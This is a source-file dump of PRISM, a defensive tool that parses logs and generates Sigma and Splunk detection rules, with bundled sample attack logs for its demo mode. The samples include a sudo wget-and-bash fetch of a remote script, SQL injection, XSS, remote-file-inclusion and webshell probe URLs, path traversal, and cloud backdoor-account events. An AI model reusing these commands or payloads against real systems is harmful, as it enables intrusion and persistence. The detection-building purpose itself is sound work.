            f"| *** Risk Score     : {risk_score}/10\n"
            f"| *** MITRE ATT&CK   : {mitre}\n"
            f"| *** Throttle       : 1 alert per source per 1 hour\n"
            f"| ***\n"
            f"| *** To deploy: Splunk > Settings > Searches & Reports > New Report\n"
            f"| *** Paste the SPL above and configure the alert trigger.\n"
        )


# ==============================================================================
# SOURCE: prism/pipeline.py
# ==============================================================================
"""
Pipeline: orchestrates parsing → detection → rule generation
"""

SEVERITY_ORDER = ["low", "medium", "high", "critical"]


class Pipeline:
    def __init__(self, log_path, output_dir, output_format, min_severity, verbose, console):
        self.log_path = log_path
        self.output_dir = output_dir
        self.output_format = output_format
        self.min_severity = min_severity
        self.verbose = verbose
        self.console = console

    def run(self):
        start_time = time.time()

        with Progress(
            SpinnerColumn(spinner_name="dots", style="accent"),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=30, style="banner2", complete_style="good"),
            TaskProgressColumn(),
            console=self.console,
            transient=True,
        ) as progress:

            # Step 1: Parse
            task = progress.add_task("[accent]Parsing log file...", total=100)
            parser = AutoParser(self.log_path, self.console, self.verbose)
            log_type, entries = parser.parse()
            progress.update(task, completed=100)

            # Step 2: Detect
            progress.update(task, description="[accent]Running detection rules...", completed=0)
            detector = DetectorEngine(log_type, self.console, self.verbose)
            findings = detector.analyze(entries)
            progress.update(task, completed=100)

            # Step 3: Filter by severity
            if self.min_severity != "all":
                min_idx = SEVERITY_ORDER.index(self.min_severity)
                findings = [f for f in findings if SEVERITY_ORDER.index(f["severity"]) >= min_idx]

            # Step 4: Generate rules
            progress.update(task, description="[accent]Generating detection rules...", completed=0)
            generated_files = []

            if self.output_format in ("sigma", "both"):
                gen = SigmaGenerator(self.output_dir)
                files = gen.generate(findings, log_type, self.log_path.name)
                generated_files.extend(files)

            if self.output_format in ("splunk", "both"):
                gen = SplunkGenerator(self.output_dir)
                files = gen.generate(findings, log_type, self.log_path.name)
                generated_files.extend(files)

            progress.update(task, completed=100)

        elapsed = time.time() - start_time
        self._print_summary(log_type, entries, findings, generated_files, elapsed)

    def _print_summary(self, log_type, entries, findings, files, elapsed):
        self.console.print()

        # Stats row
        stats_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 2), expand=False)
        stats_table.add_column(style="dim", no_wrap=True)
        stats_table.add_column(style="bold white", max_width=50, overflow="fold")
        stats_table.add_row("Log Type", log_type)
        stats_table.add_row("Entries Parsed", f"{len(entries):,}")
        stats_table.add_row("Patterns Detected", str(len(findings)))
        stats_table.add_row("Rules Generated", str(len(files)))
        stats_table.add_row("Time Elapsed", f"{elapsed:.2f}s")
        self.console.print(Panel(stats_table, title="[title] Analysis Complete [/]", border_style="border", expand=False))

        if not findings:
            self.console.print("\n[good]✓ No suspicious patterns detected.[/good]\n")
            return

        # Findings table
        self.console.print("\n[bold white]Detected Patterns:[/bold white]")
        table = Table(box=box.ROUNDED, border_style="border", show_lines=True, expand=False)
        table.add_column("Severity", style="bold", width=10, no_wrap=True)
        table.add_column("Pattern", style="white", ratio=3, overflow="fold")
        table.add_column("MITRE ATT&CK", style="accent2", width=14, no_wrap=True)
        table.add_column("Hits", justify="right", style="warn", width=6, no_wrap=True)
        table.add_column("Rule Name", style="good", ratio=2, overflow="fold")

        severity_color = {
            "low": "dim white",
            "medium": "warn",
            "high": "accent2",
            "critical": "bad",
        }

        for f in sorted(findings, key=lambda x: SEVERITY_ORDER.index(x["severity"]), reverse=True):
            sev = f["severity"]
            color = severity_color.get(sev, "white")
            table.add_row(
                f"[{color}]{sev.upper()}[/{color}]",
                f["title"],
                f.get("mitre_technique", "—"),
                str(f.get("hit_count", 1)),
                f["rule_name"],
            )

        self.console.print(table)

        # Output files
        if files:
            self.console.print("\n[bold white]Generated Files:[/bold white]")
            for f in files:
                self.console.print(f"  [good]✓[/good] {f}")

        self.console.print()


# ==============================================================================
# SOURCE: prism.py
# ==============================================================================
#!/usr/bin/env python3
"""
PRISM — SIEM Rule Generator from Raw Logs
Automatically identifies suspicious patterns and generates Sigma detection rules.
"""


# ─────────────────────────────────────────────────────────────────────────
# THEME — abyss ink & cherry red
# ─────────────────────────────────────────────────────────────────────────

PRISM_THEME = Theme({
    "accent":   "bold red1",
    "accent2":  "indian_red1",
    "accent3":  "bold red3",
    "banner2":  "bold deep_sky_blue4",
    "good":     "bold spring_green3",
    "warn":     "bold yellow3",
    "bad":      "bold red3",
    "critical": "bold white on red3",
    "dim":      "grey58",
    "title":    "bold red1 on grey11",
    "border":   "red1",
})

console = Console(theme=PRISM_THEME)

BANNER = r"""
██████╗ ██████╗ ██╗███████╗███╗   ███╗
██╔══██╗██╔══██╗██║██╔════╝████╗ ████║
██████╔╝██████╔╝██║███████╗██╔████╔██║
██╔═══╝ ██╔══██╗██║╚════██║██║╚██╔╝██║
██║     ██║  ██║██║███████║██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚═╝
"""


def print_banner():
    """Two-tone banner: alternating cherry-red / abyss-ink lines, a rule,
    then a tagline panel — mirrors PASSEC's dashboard-style banner treatment."""
    lines = BANNER.splitlines()
    styles = ["accent", "banner2"]
    for i, line in enumerate(lines):
        if not line.strip():
            console.print()
            continue
        console.print(Align.left(Text(line, style=styles[i % 2])))
    console.print(Align.left(Text("", style="dim")))
    console.print(Rule(style="border"))
           
    


def action_analyze_menu():
    """Interactive replacement for `PRISM analyze <path>` — prompts the
    user for the log path and options instead of requiring CLI flags."""
    path_str = Prompt.ask("[accent]Path to log file[/]").strip().strip('"').strip("'")
    log_path = Path(path_str).expanduser()

    if not log_path.exists():
        console.print(f"[bad]✗ Log file not found:[/bad] {log_path}")
        return

    fmt = Prompt.ask(
        "Output format", choices=["sigma", "splunk", "both"], default="sigma"
    )
    output = Prompt.ask("Output directory", default="./output/rules")
    severity = Prompt.ask(
        "Minimum severity",
        choices=["low", "medium", "high", "critical", "all"],
        default="all",
    )
    verbose = Confirm.ask("Show detailed (verbose) output?", default=False)

    args = argparse.Namespace(
        logfile=str(log_path),
        format=fmt,
        output=output,
        severity=severity,
        verbose=verbose,
        no_banner=True,
    )
    run_analysis(args)


def action_demo_menu():
    """Interactive replacement for `PRISM demo --type <type>`."""
    demo_type = Prompt.ask(
        "Sample log type",
        choices=["auth", "apache", "windows", "csv", "json", "xml"],
        default="auth",
    )
    run_demo(argparse.Namespace(type=demo_type))


def action_help_menu():
    # --- Menu options (CLI equivalent shown inline, dimmed) --------------
    menu_table = Table(
        box=ROUNDED, border_style="border", padding=(0, 1), expand=False,
        title="MENU OPTIONS", title_style="bold accent", title_justify="left",
    )
    menu_table.add_column("Key", style="accent", justify="center", width=4, no_wrap=True)
    menu_table.add_column("Action", style="bold white", width=17, no_wrap=True)
    menu_table.add_column("Description", max_width=56, overflow="fold")
    menu_table.add_row(
        "1", "Analyze Log File",
        "Prompts for a log path, output format, output folder, and minimum "
        "severity, then writes detection rules.\n"
        "[dim]CLI: PRISM analyze <logfile> [--format] [--severity][/dim]",
    )
    menu_table.add_row(
        "2", "Run Demo",
        "Runs the full pipeline on a bundled sample log, no file needed.\n"
        "[dim]CLI: PRISM demo --type <type>[/dim]",
    )
    menu_table.add_row("h", "Help", "Shows this screen.")
    menu_table.add_row("q", "Quit", "Exits PRISM.")

    # --- Supported log types ---------------------------------------------
    types_table = Table(
        box=ROUNDED, border_style="border", padding=(0, 1), expand=False,
        title="SUPPORTED LOG TYPES", title_style="bold accent", title_justify="left",
    )
    types_table.add_column("Type", style="accent2", width=9, no_wrap=True)
    types_table.add_column("Description", max_width=60, overflow="fold")
    types_table.add_row("auth", "Linux/Unix auth.log — SSH logins, sudo, password failures.")
    types_table.add_row("apache", "Apache/Nginx combined access logs — HTTP requests, status codes.")
    types_table.add_row("windows", "Windows Security event logs (text or exported .evtx/XML) — "
                         "logons, account/group changes, Kerberos, service installs.")
    types_table.add_row("csv", "Generic CSV export (e.g. cloud audit trail) — fields auto-mapped "
                         "by header name (src_ip, user, action, etc.).")
    types_table.add_row("json", "Generic JSON/NDJSON logs — nested fields flattened and auto-mapped.")
    types_table.add_row("xml", "Generic XML logs (e.g. Windows Event XML) — same auto-mapping as JSON.")

    # --- Output formats & severity ----------------------------------------
    opts_table = Table(
        box=ROUNDED, border_style="border", padding=(0, 1), expand=False,
        title="OUTPUT FORMATS & SEVERITY", title_style="bold accent", title_justify="left",
    )
    opts_table.add_column("Option", style="good", width=9, no_wrap=True)
    opts_table.add_column("Description", max_width=60, overflow="fold")
    opts_table.add_row("sigma", "Generate vendor-neutral Sigma detection rules (.yml).")
    opts_table.add_row("splunk", "Generate Splunk Search Processing Language (SPL) rules.")
    opts_table.add_row("both", "Generate both Sigma and Splunk rules for every finding.")
    opts_table.add_row("severity", "low / medium / high / critical / all — filters out findings "
                        "below the chosen threshold (\"all\" keeps everything).")

    body = Group(menu_table, Text(""), types_table, Text(""), opts_table)

    console.print(Panel(
        body,
        title="[title] PRISM HELP [/]",
        subtitle="Enter a menu number/letter at the prompt to run that action",
        border_style="border",
        expand=False,
    ))


MENU_ACTIONS = {
    "1": ("Analyze Log File (choose a path)", action_analyze_menu),
    "2": ("Run Demo (bundled sample logs)", action_demo_menu),
    "h": ("Help", action_help_menu),
}


def build_arg_parser():
    parser = argparse.ArgumentParser(
        prog="PRISM",
        description="Automatically generate Sigma detection rules from raw log files",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  PRISM analyze auth.log
  PRISM analyze windows_security.evtx --format sigma --output ./rules/
  PRISM analyze access.log --format splunk --severity high
  PRISM analyze /var/log/auth.log --verbose

Run PRISM with no arguments to launch the interactive menu instead.
        """,
    )

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # analyze command
    analyze_parser = subparsers.add_parser("analyze", help="Analyze a log file and generate detection rules")
    analyze_parser.add_argument("logfile", help="Path to the log file to analyze")
    analyze_parser.add_argument(
        "--format",
        choices=["sigma", "splunk", "both"],
        default="sigma",
        help="Output rule format (default: sigma)",
    )
    analyze_parser.add_argument(
        "--output", "-o",
        default="./output/rules",
        help="Output directory for generated rules (default: ./output/rules)",
    )
    analyze_parser.add_argument(
        "--severity",
        choices=["low", "medium", "high", "critical", "all"],
        default="all",
        help="Minimum severity threshold for rules (default: all)",
    )
    analyze_parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Show detailed analysis output",
    )
    analyze_parser.add_argument(
        "--no-banner",
        action="store_true",
        help="Suppress the ASCII banner",
    )

    # demo command
    demo_parser = subparsers.add_parser("demo", help="Run a demo analysis on bundled sample logs")
    demo_parser.add_argument(
        "--type",
        choices=["auth", "apache", "windows", "csv", "json", "xml"],
        default="auth",
        help="Sample log type to demo (default: auth)",
    )

    return parser


def main():
    args = build_arg_parser().parse_args()

    # Direct CLI usage still works exactly as before.
    if args.command == "demo":
        print_banner()
        run_demo(args)
        return
    elif args.command == "analyze":
        if not getattr(args, "no_banner", False):
            print_banner()
        run_analysis(args)
        return

    # No CLI command given → drop into the interactive menu, letting the
    # user choose the log path themselves instead of typing flags.
    print_banner()

    while True:
        console.print()
        menu = Table.grid(padding=(0, 2))
        menu.add_column(style="accent", justify="right")
        menu.add_column()
        for i, (key, (label, _)) in enumerate(MENU_ACTIONS.items()):
            color = "accent" if i % 2 == 0 else "banner2"
            menu.add_row(f"{key}.", f"[{color}]{label}[/]")
        menu.add_row("q.", "[banner2]Quit[/]")
        console.print(Panel.fit(menu, title="[title] MAIN MENU [/]", border_style="border"))

        try:
            choice = Prompt.ask("[accent]Select an option[/]").strip().lower()
        except (KeyboardInterrupt, EOFError):
            console.print("\n[accent]Stay sharp. [/]\n")
            break

        if choice in ("q", "quit", "exit"):
            console.print("\n[accent]Stay sharp. [/]\n")
            break

        action = MENU_ACTIONS.get(choice)
        if not action:
            console.print("[warn]Invalid option — try again.[/]")
            continue

        try:
            action[1]()
        except KeyboardInterrupt:
            console.print("\n[warn]Cancelled.[/]")
        except Exception as e:
            console.print(f"[bad]Unexpected error: {e}[/]")


SAMPLE_LOGS = {
    # SSH user-enumeration + brute force from one attacker IP, culminating in
    # a successful root login and a dropped persistence mechanism, plus a
    # smaller/unrelated probe from a second IP and normal deploy activity.
    "auth": ("auth.log", (
        "Jan 15 03:10:01 web01 sshd[21200]: Invalid user admin from 203.0.113.42 port 51400\n"
        "Jan 15 03:10:01 web01 sshd[21200]: Failed password for invalid user admin from 203.0.113.42 port 51400 ssh2\n"
        "Jan 15 03:10:06 web01 sshd[21203]: Invalid user administrator from 203.0.113.42 port 51402\n"
        "Jan 15 03:10:06 web01 sshd[21203]: Failed password for invalid user administrator from 203.0.113.42 port 51402 ssh2\n"
        "Jan 15 03:10:11 web01 sshd[21206]: Invalid user test from 203.0.113.42 port 51404\n"
        "Jan 15 03:10:11 web01 sshd[21206]: Failed password for invalid user test from 203.0.113.42 port 51404 ssh2\n"
        "Jan 15 03:10:17 web01 sshd[21209]: Invalid user oracle from 203.0.113.42 port 51406\n"
        "Jan 15 03:10:17 web01 sshd[21209]: Failed password for invalid user oracle from 203.0.113.42 port 51406 ssh2\n"
        "Jan 15 03:10:22 web01 sshd[21212]: Invalid user postgres from 203.0.113.42 port 51408\n"
        "Jan 15 03:10:22 web01 sshd[21212]: Failed password for invalid user postgres from 203.0.113.42 port 51408 ssh2\n"
        "Jan 15 03:10:28 web01 sshd[21215]: Invalid user ubuntu from 203.0.113.42 port 51410\n"
        "Jan 15 03:10:28 web01 sshd[21215]: Failed password for invalid user ubuntu from 203.0.113.42 port 51410 ssh2\n"
        "Jan 15 03:12:41 web01 sshd[21345]: Failed password for root from 203.0.113.42 port 51422 ssh2\n"
        "Jan 15 03:12:44 web01 sshd[21345]: Failed password for root from 203.0.113.42 port 51423 ssh2\n"
        "Jan 15 03:12:50 web01 sshd[21346]: Failed password for root from 203.0.113.42 port 51430 ssh2\n"
        "Jan 15 03:13:15 web01 sshd[21349]: Accepted password for root from 203.0.113.42 port 51431 ssh2\n"
        "Jan 15 03:13:15 web01 sshd[21349]: pam_unix(sshd:session): session opened for user root by (uid=0)\n"
        "Jan 15 03:14:02 web01 useradd[21360]: new user: name=svc_updater, UID=1010, GID=1010, home=/home/svc_updater, shell=/bin/bash\n"
        "Jan 15 03:15:40 web01 sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.33.32.156/update.sh -O /tmp/update.sh\n"
        "Jan 15 03:15:44 web01 sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/update.sh\n"
        "Jan 15 03:20:11 web01 sshd[21349]: pam_unix(sshd:session): session closed for user root\n"
        "Jan 15 03:45:02 web01 sshd[21388]: Invalid user oracle from 45.33.32.156 port 44012\n"
        "Jan 15 03:45:02 web01 sshd[21388]: Failed password for invalid user oracle from 45.33.32.156 port 44012 ssh2\n"
        "Jan 15 03:45:09 web01 sshd[21390]: Invalid user oracle from 45.33.32.156 port 44014\n"
        "Jan 15 03:45:09 web01 sshd[21390]: Failed password for invalid user oracle from 45.33.32.156 port 44014 ssh2\n"
        "Jan 15 04:13:02 web01 sshd[21350]: Accepted password for deploy from 198.51.100.7 port 22 ssh2\n"
        "Jan 15 04:13:02 web01 sshd[21350]: pam_unix(sshd:session): session opened for user deploy by (uid=0)\n"
        "Jan 15 04:20:11 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx\n"
        "Jan 15 04:25:33 web01 sshd[21350]: pam_unix(sshd:session): session closed for user deploy\n"
    )),
    # Automated recon/directory-brute-force from one IP (sqlmap UA), SQLi and
    # webshell/RFI/traversal probing from a second IP (Nikto UA), plus a
    # slice of normal deploy traffic for contrast.
    "apache": ("apache_access.log", (
        '203.0.113.42 - - [15/Jan/2026:03:14:00 -0500] "GET /wp-admin/admin-ajax.php HTTP/1.1" 404 512 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:02 -0500] "GET /wp-login.php HTTP/1.1" 404 498 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:04 -0500] "GET /phpmyadmin/ HTTP/1.1" 404 501 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:06 -0500] "GET /.env HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:08 -0500] "GET /.git/config HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:10 -0500] "GET /xmlrpc.php HTTP/1.1" 404 490 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:12 -0500] "GET /.aws/credentials HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:14 -0500] "GET /server-status HTTP/1.1" 403 320 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:16 -0500] "GET /actuator/health HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:18 -0500] "GET /swagger-ui.html HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:20 -0500] "GET /vendor/composer/installed.json HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:22 -0500] "GET /wp-content/debug.log HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:24 -0500] "GET /.htaccess HTTP/1.1" 403 320 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:26 -0500] "GET /old/backup.tar.gz HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:28 -0500] "GET /manager/html HTTP/1.1" 401 320 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:30 -0500] "GET /console/ HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:32 -0500] "GET /config.php.bak HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:34 -0500] "GET /.well-known/security.txt HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:36 -0500] "GET /sitemap.xml.bak HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:14:38 -0500] "GET /admin/config.json HTTP/1.1" 404 480 "-" "sqlmap/1.6.12#stable"\n'
        '203.0.113.42 - - [15/Jan/2026:03:15:00 -0500] "GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 1029 "-" "Mozilla/5.0"\n'
        '203.0.113.42 - - [15/Jan/2026:03:15:04 -0500] "GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 500 1140 "-" "Mozilla/5.0"\n'
        '203.0.113.42 - - [15/Jan/2026:03:16:44 -0500] "GET /backup.sql HTTP/1.1" 200 20481 "-" "Nikto/2.5.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:02 -0500] "GET /../../etc/passwd HTTP/1.1" 403 0 "-" "Nikto/2.5.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:11 -0500] "GET /admin/ HTTP/1.1" 404 0 "-" "Nikto/2.5.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:20 -0500] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 404 0 "-" "Mozilla/5.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:35 -0500] "GET /index.php?page=http://evil.example.com/backdoor.txt.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:48 -0500] "GET /shell.php?cmd=whoami HTTP/1.1" 404 0 "-" "curl/7.68.0"\n'
        '45.33.32.156 - - [15/Jan/2026:03:17:55 -0500] "GET /c99.php HTTP/1.1" 404 0 "-" "curl/7.68.0"\n'
        '198.51.100.7 - deploy [15/Jan/2026:03:20:00 -0500] "GET /dashboard HTTP/1.1" 200 4322 "-" "Mozilla/5.0 (Macintosh)"\n'
        '198.51.100.7 - deploy [15/Jan/2026:03:20:05 -0500] "POST /login HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Macintosh)"\n'
        '198.51.100.7 - deploy [15/Jan/2026:03:20:12 -0500] "GET /api/health HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Macintosh)"\n'
    )),
    # Password-spray brute force (4625) followed by the classic Windows
    # persistence + lateral-movement + anti-forensics chain: new account,
    # group membership change, scheduled task, service install,
    # Kerberoasting against multiple SPNs, and a cleared audit log.
    "windows": ("windows_security.log", (
        "01/15/2026 03:12:41 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user admin from source address 203.0.113.42\n"
        "01/15/2026 03:12:47 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user administrator from source address 203.0.113.42\n"
        "01/15/2026 03:12:53 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user svc_sql from source address 203.0.113.42\n"
        "01/15/2026 03:12:59 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user jdoe from source address 203.0.113.42\n"
        "01/15/2026 03:13:05 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user backup_admin from source address 203.0.113.42\n"
        "01/15/2026 03:13:11 AM Microsoft-Windows-Security-Auditing 4625 Logon\tAn account failed to log on for user administrator from source address 203.0.113.42\n"
        "01/15/2026 03:20:10 AM Microsoft-Windows-Security-Auditing 4672 Special Logon\tSpecial privileges assigned to new logon for administrator\n"
        "01/15/2026 03:25:33 AM Microsoft-Windows-Security-Auditing 4720 User Account Management\tA user account was created for svc_backup\n"
        "01/15/2026 03:26:01 AM Microsoft-Windows-Security-Auditing 4732 Security Group Management\tsvc_backup was added to the Administrators security-enabled local group\n"
        "01/15/2026 03:30:15 AM Microsoft-Windows-Security-Auditing 4698 Object Access\tA scheduled task was created: \\Microsoft\\Windows\\UpdateOrchestrator\\SystemSync\n"
        "01/15/2026 03:32:40 AM Microsoft-Windows-Security-Auditing 7045 Service Install\tA new service was installed: WinDefendUpdate, command line C:\\Windows\\Temp\\svcupd.exe\n"
        "01/15/2026 03:40:12 AM Microsoft-Windows-Security-Auditing 4769 Kerberos Service Ticket\tA Kerberos service ticket was requested for SPN MSSQLSvc/sql01.corp.local:1433\n"
        "01/15/2026 03:40:18 AM Microsoft-Windows-Security-Auditing 4769 Kerberos Service Ticket\tA Kerberos service ticket was requested for SPN HTTP/intranet.corp.local\n"
        "01/15/2026 03:40:24 AM Microsoft-Windows-Security-Auditing 4769 Kerberos Service Ticket\tA Kerberos service ticket was requested for SPN CIFS/fileserver01.corp.local\n"
        "01/15/2026 03:40:30 AM Microsoft-Windows-Security-Auditing 4769 Kerberos Service Ticket\tA Kerberos service ticket was requested for SPN MSSQLSvc/sql02.corp.local:1433\n"
        "01/15/2026 04:00:00 AM Microsoft-Windows-Eventlog 1102 Log Clear\tThe audit log was cleared.\n"
    )),
    # Firewall export: a wide multi-port scan/probe from one attacker IP
    # (all denied), a smaller probe from a second IP, then legitimate deploy
    # traffic and a suspicious internal call out to the cloud metadata service.
    "csv": ("firewall.csv", (
        "timestamp,src_ip,dst_ip,dst_port,protocol,action,username\n"
        "2026-01-15T03:10:00Z,203.0.113.42,10.0.0.5,22,tcp,deny,-\n"
        "2026-01-15T03:10:02Z,203.0.113.42,10.0.0.5,23,tcp,deny,-\n"
        "2026-01-15T03:10:04Z,203.0.113.42,10.0.0.5,21,tcp,deny,-\n"
        "2026-01-15T03:10:06Z,203.0.113.42,10.0.0.5,445,tcp,deny,-\n"
        "2026-01-15T03:10:08Z,203.0.113.42,10.0.0.5,3389,tcp,deny,-\n"
        "2026-01-15T03:10:10Z,203.0.113.42,10.0.0.5,3306,tcp,deny,-\n"
        "2026-01-15T03:10:12Z,203.0.113.42,10.0.0.5,5432,tcp,deny,-\n"
        "2026-01-15T03:10:14Z,203.0.113.42,10.0.0.5,6379,tcp,deny,-\n"
        "2026-01-15T03:10:16Z,203.0.113.42,10.0.0.5,9200,tcp,deny,-\n"
        "2026-01-15T03:10:18Z,203.0.113.42,10.0.0.5,27017,tcp,deny,-\n"
        "2026-01-15T03:10:20Z,203.0.113.42,10.0.0.5,8080,tcp,deny,-\n"
        "2026-01-15T03:10:22Z,203.0.113.42,10.0.0.5,8443,tcp,deny,-\n"
        "2026-01-15T03:12:00Z,45.33.32.156,10.0.0.8,3389,tcp,deny,-\n"
        "2026-01-15T03:12:05Z,45.33.32.156,10.0.0.8,22,tcp,deny,-\n"
        "2026-01-15T03:15:00Z,198.51.100.7,10.0.0.10,443,tcp,allow,deploy\n"
        "2026-01-15T03:20:00Z,10.0.0.10,169.254.169.254,80,tcp,allow,root\n"
        "2026-01-15T04:00:00Z,203.0.113.42,10.0.0.5,3306,tcp,deny,-\n"
    )),
    # AWS CloudTrail: an IAM console password spray that succeeds, followed
    # by the attacker minting a backdoor admin user and access key, then
    # disabling CloudTrail logging to cover their tracks.
    "json": ("cloudtrail.json", json.dumps({
        "Records": [
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:00Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
                "errorMessage": "Failed authentication",
                "responseElements": {"ConsoleLogin": "Failure"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:05Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "administrator"},
                "errorMessage": "Failed authentication",
                "responseElements": {"ConsoleLogin": "Failure"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:10Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "admin"},
                "errorMessage": "Failed authentication",
                "responseElements": {"ConsoleLogin": "Failure"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:15Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "backup-user"},
                "errorMessage": "Failed authentication",
                "responseElements": {"ConsoleLogin": "Failure"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:20Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "deploy"},
                "errorMessage": "Failed authentication",
                "responseElements": {"ConsoleLogin": "Failure"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:10:32Z",
                "eventSource": "signin.amazonaws.com",
                "eventName": "ConsoleLogin",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
                "responseElements": {"ConsoleLogin": "Success"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:11:00Z",
                "eventSource": "iam.amazonaws.com",
                "eventName": "CreateUser",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
                "requestParameters": {"userName": "backdoor-user"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:11:10Z",
                "eventSource": "iam.amazonaws.com",
                "eventName": "AttachUserPolicy",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
                "requestParameters": {
                    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
                    "userName": "backdoor-user",
                },
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:11:20Z",
                "eventSource": "iam.amazonaws.com",
                "eventName": "CreateAccessKey",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
                "requestParameters": {"userName": "backdoor-user"},
            },
            {
                "eventVersion": "1.08",
                "eventTime": "2026-01-15T03:15:00Z",
                "eventSource": "cloudtrail.amazonaws.com",
                "eventName": "StopLogging",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "203.0.113.42",
                "userIdentity": {"type": "IAMUser", "userName": "root"},
            },
        ]
    }, indent=2)),
    # Windows Security event export in XML form: the same brute force +
    # Kerberoasting + persistence + anti-forensics chain as the windows.log
    # sample, so XML-fed pipelines get an equally detailed demo.
    "xml": ("winevents.xml", (
        '<Events>\n'
        '  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '    <System>\n'
        '      <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        '      <EventID>4625</EventID>\n'
